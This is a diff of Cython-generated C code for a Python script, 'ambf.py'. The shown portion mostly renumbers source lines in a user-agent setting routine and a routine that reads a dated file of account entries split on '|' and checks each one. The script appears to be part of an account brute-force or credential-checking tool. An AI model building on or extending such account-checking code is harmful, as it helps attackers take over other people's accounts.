-    __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_v_c_ua, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 600, __pyx_L1_error)
+    __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_v_c_ua, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 594, __pyx_L1_error)
     if (__pyx_t_5) {
 
-      /* "ambf.py":601
+      /* "ambf.py":595
  * 		c_ua = input(" [+] user-agent : ")
  * 		if c_ua == "":
  * 			exit("\n [!] jangan kosong")             # <<<<<<<<<<<<<<
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  */
-      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 601, __pyx_L1_error)
+      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 595, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_1);
       __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-      /* "ambf.py":600
+      /* "ambf.py":594
  * 	elif ua in ["7", "07"]:
  * 		c_ua = input(" [+] user-agent : ")
  * 		if c_ua == "":             # <<<<<<<<<<<<<<
@@ -18558,16 +18317,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
     }
 
-    /* "ambf.py":602
+    /* "ambf.py":596
  * 		if c_ua == "":
  * 			exit("\n [!] jangan kosong")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 602, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 596, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 602, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 596, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -18582,21 +18341,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 602, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 596, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":603
+    /* "ambf.py":597
  * 			exit("\n [!] jangan kosong")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 603, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 597, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 603, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 597, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -18611,30 +18370,30 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 603, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 597, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":604
+    /* "ambf.py":598
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	else:
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 604, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 598, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":605
+    /* "ambf.py":599
  * 		time.sleep(1)
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	else:
  * 		menu()
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 605, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 599, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
@@ -18648,12 +18407,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 605, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 599, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":598
+    /* "ambf.py":592
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["7", "07"]:             # <<<<<<<<<<<<<<
@@ -18663,15 +18422,15 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":607
+  /* "ambf.py":601
  * 		menu()
  * 	else:
  * 		menu()             # <<<<<<<<<<<<<<
  * 
- * #-> Cek Opsi
+ * def cek_opsi():
  */
   /*else*/ {
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 607, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 601, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
@@ -18685,14 +18444,14 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 607, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 601, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   }
   __pyx_L3:;
 
-  /* "ambf.py":544
+  /* "ambf.py":538
  * 	print(" [3]. method mobile (mode low)")
  * 
  * def setting_ua():             # <<<<<<<<<<<<<<
@@ -18717,9 +18476,9 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
   return __pyx_r;
 }
 
-/* "ambf.py":610
+/* "ambf.py":603
+ * 		menu()
  * 
- * #-> Cek Opsi
  * def cek_opsi():             # <<<<<<<<<<<<<<
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")
@@ -18766,51 +18525,51 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("cek_opsi", 0);
 
-  /* "ambf.py":611
- * #-> Cek Opsi
+  /* "ambf.py":604
+ * 
  * def cek_opsi():
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))             # <<<<<<<<<<<<<<
  * 	files = input(" [?] nama file  : ")
  * 	if files == "":
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 611, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 604, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
-  __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_masukan_file_ex_CP_s_txt, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 611, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_masukan_file_ex_CP_s_txt, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 604, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-  if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 611, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 604, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-  /* "ambf.py":612
+  /* "ambf.py":605
  * def cek_opsi():
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")             # <<<<<<<<<<<<<<
  * 	if files == "":
  * 		menu()
  */
-  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 612, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 605, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __pyx_v_files = __pyx_t_2;
   __pyx_t_2 = 0;
 
-  /* "ambf.py":613
+  /* "ambf.py":606
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")
  * 	if files == "":             # <<<<<<<<<<<<<<
  * 		menu()
  * 	try:
  */
-  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_v_files, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 613, __pyx_L1_error)
+  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_v_files, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 606, __pyx_L1_error)
   if (__pyx_t_3) {
 
-    /* "ambf.py":614
+    /* "ambf.py":607
  * 	files = input(" [?] nama file  : ")
  * 	if files == "":
  * 		menu()             # <<<<<<<<<<<<<<
  * 	try:
  * 		buka_baju = open(files, "r").readlines()
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 614, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 607, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
@@ -18824,12 +18583,12 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     }
     __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 614, __pyx_L1_error)
+    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 607, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-    /* "ambf.py":613
+    /* "ambf.py":606
  * 	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
  * 	files = input(" [?] nama file  : ")
  * 	if files == "":             # <<<<<<<<<<<<<<
@@ -18838,7 +18597,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
  */
   }
 
-  /* "ambf.py":615
+  /* "ambf.py":608
  * 	if files == "":
  * 		menu()
  * 	try:             # <<<<<<<<<<<<<<
@@ -18854,14 +18613,14 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XGOTREF(__pyx_t_7);
     /*try:*/ {
 
-      /* "ambf.py":616
+      /* "ambf.py":609
  * 		menu()
  * 	try:
  * 		buka_baju = open(files, "r").readlines()             # <<<<<<<<<<<<<<
  * 	except IOError:
  * 		exit("\n [!] nama file %s tidak tersedia"%(files))
  */
-      __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 616, __pyx_L4_error)
+      __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 609, __pyx_L4_error)
       __Pyx_GOTREF(__pyx_t_1);
       __Pyx_INCREF(__pyx_v_files);
       __Pyx_GIVEREF(__pyx_v_files);
@@ -18869,10 +18628,10 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
       __Pyx_INCREF(__pyx_n_s_r);
       __Pyx_GIVEREF(__pyx_n_s_r);
       PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_r);
-      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 616, __pyx_L4_error)
+      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 609, __pyx_L4_error)
       __Pyx_GOTREF(__pyx_t_4);
       __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_readlines); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 616, __pyx_L4_error)
+      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_readlines); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 609, __pyx_L4_error)
       __Pyx_GOTREF(__pyx_t_1);
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
       __pyx_t_4 = NULL;
@@ -18887,13 +18646,13 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
       }
       __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 616, __pyx_L4_error)
+      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 609, __pyx_L4_error)
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
       __pyx_v_buka_baju = __pyx_t_2;
       __pyx_t_2 = 0;
 
-      /* "ambf.py":615
+      /* "ambf.py":608
  * 	if files == "":
  * 		menu()
  * 	try:             # <<<<<<<<<<<<<<
@@ -18910,7 +18669,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":617
+    /* "ambf.py":610
  * 	try:
  * 		buka_baju = open(files, "r").readlines()
  * 	except IOError:             # <<<<<<<<<<<<<<
@@ -18920,21 +18679,21 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
     if (__pyx_t_8) {
       __Pyx_AddTraceback("ambf.cek_opsi", __pyx_clineno, __pyx_lineno, __pyx_filename);
-      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_4) < 0) __PYX_ERR(0, 617, __pyx_L6_except_error)
+      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_4) < 0) __PYX_ERR(0, 610, __pyx_L6_except_error)
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_GOTREF(__pyx_t_1);
       __Pyx_GOTREF(__pyx_t_4);
 
-      /* "ambf.py":618
+      /* "ambf.py":611
  * 		buka_baju = open(files, "r").readlines()
  * 	except IOError:
  * 		exit("\n [!] nama file %s tidak tersedia"%(files))             # <<<<<<<<<<<<<<
  * 	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
  * 	print(" [*] sedang prosess cek akun....")
  */
-      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_nama_file_s_tidak_tersedia, __pyx_v_files); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 618, __pyx_L6_except_error)
+      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_nama_file_s_tidak_tersedia, __pyx_v_files); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 611, __pyx_L6_except_error)
       __Pyx_GOTREF(__pyx_t_9);
-      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 618, __pyx_L6_except_error)
+      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 611, __pyx_L6_except_error)
       __Pyx_GOTREF(__pyx_t_10);
       __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
       __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
@@ -18946,7 +18705,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     goto __pyx_L6_except_error;
     __pyx_L6_except_error:;
 
-    /* "ambf.py":615
+    /* "ambf.py":608
  * 	if files == "":
  * 		menu()
  * 	try:             # <<<<<<<<<<<<<<
@@ -18966,64 +18725,64 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     __pyx_L9_try_end:;
   }
 
-  /* "ambf.py":619
+  /* "ambf.py":612
  * 	except IOError:
  * 		exit("\n [!] nama file %s tidak tersedia"%(files))
  * 	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))             # <<<<<<<<<<<<<<
  * 	print(" [*] sedang prosess cek akun....")
  * 	for memek in buka_baju:
  */
-  if (unlikely(!__pyx_v_buka_baju)) { __Pyx_RaiseUnboundLocalError("buka_baju"); __PYX_ERR(0, 619, __pyx_L1_error) }
-  __pyx_t_11 = PyObject_Length(__pyx_v_buka_baju); if (unlikely(__pyx_t_11 == ((Py_ssize_t)-1))) __PYX_ERR(0, 619, __pyx_L1_error)
-  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 619, __pyx_L1_error)
+  if (unlikely(!__pyx_v_buka_baju)) { __Pyx_RaiseUnboundLocalError("buka_baju"); __PYX_ERR(0, 612, __pyx_L1_error) }
+  __pyx_t_11 = PyObject_Length(__pyx_v_buka_baju); if (unlikely(__pyx_t_11 == ((Py_ssize_t)-1))) __PYX_ERR(0, 612, __pyx_L1_error)
+  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 612, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
-  __pyx_t_1 = __Pyx_PyString_Format(__pyx_kp_s_total_akun_0_91m_s_0_97m, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 619, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyString_Format(__pyx_kp_s_total_akun_0_91m_s_0_97m, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 612, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-  if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 619, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 612, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":620
+  /* "ambf.py":613
  * 		exit("\n [!] nama file %s tidak tersedia"%(files))
  * 	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
  * 	print(" [*] sedang prosess cek akun....")             # <<<<<<<<<<<<<<
  * 	for memek in buka_baju:
  * 		kontol = memek.replace("\n","")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_sedang_prosess_cek_akun) < 0) __PYX_ERR(0, 620, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_sedang_prosess_cek_akun) < 0) __PYX_ERR(0, 613, __pyx_L1_error)
 
-  /* "ambf.py":621
+  /* "ambf.py":614
  * 	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
  * 	print(" [*] sedang prosess cek akun....")
  * 	for memek in buka_baju:             # <<<<<<<<<<<<<<
  * 		kontol = memek.replace("\n","")
  * 		titid  = kontol.split("|")
  */
-  if (unlikely(!__pyx_v_buka_baju)) { __Pyx_RaiseUnboundLocalError("buka_baju"); __PYX_ERR(0, 621, __pyx_L1_error) }
+  if (unlikely(!__pyx_v_buka_baju)) { __Pyx_RaiseUnboundLocalError("buka_baju"); __PYX_ERR(0, 614, __pyx_L1_error) }
   if (likely(PyList_CheckExact(__pyx_v_buka_baju)) || PyTuple_CheckExact(__pyx_v_buka_baju)) {
     __pyx_t_1 = __pyx_v_buka_baju; __Pyx_INCREF(__pyx_t_1); __pyx_t_11 = 0;
     __pyx_t_12 = NULL;
   } else {
-    __pyx_t_11 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_buka_baju); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 621, __pyx_L1_error)
+    __pyx_t_11 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_buka_baju); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 614, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_12 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 621, __pyx_L1_error)
+    __pyx_t_12 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 614, __pyx_L1_error)
   }
   for (;;) {
     if (likely(!__pyx_t_12)) {
       if (likely(PyList_CheckExact(__pyx_t_1))) {
         if (__pyx_t_11 >= PyList_GET_SIZE(__pyx_t_1)) break;
         #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_11); __Pyx_INCREF(__pyx_t_4); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 621, __pyx_L1_error)
+        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_11); __Pyx_INCREF(__pyx_t_4); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 614, __pyx_L1_error)
         #else
-        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 621, __pyx_L1_error)
+        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 614, __pyx_L1_error)
         __Pyx_GOTREF(__pyx_t_4);
         #endif
       } else {
         if (__pyx_t_11 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
         #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_11); __Pyx_INCREF(__pyx_t_4); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 621, __pyx_L1_error)
+        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_11); __Pyx_INCREF(__pyx_t_4); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 614, __pyx_L1_error)
         #else
-        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 621, __pyx_L1_error)
+        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 614, __pyx_L1_error)
         __Pyx_GOTREF(__pyx_t_4);
         #endif
       }
@@ -19033,7 +18792,7 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
         PyObject* exc_type = PyErr_Occurred();
         if (exc_type) {
           if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-          else __PYX_ERR(0, 621, __pyx_L1_error)
+          else __PYX_ERR(0, 614, __pyx_L1_error)
         }
         break;
       }
@@ -19042,29 +18801,29 @@ static PyObject *__pyx_pf_4ambf_32cek_opsi(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XDECREF_SET(__pyx_v_memek, __pyx_t_4);
     __pyx_t_4 = 0;
 
-    /* "ambf.py":622
+    /* "ambf.py":615
  * 	print(" [*] sedang prosess cek akun....")
  * 	for memek in buka_baju:
  * 		kontol = memek.replace("\n","")             # <<<<<<<<<<<<<<
  * 		titid  = kontol.split("|")
  * 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
  */
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_memek, __pyx_n_s_replace); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 622, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_memek, __pyx_n_s_replace); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 615, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
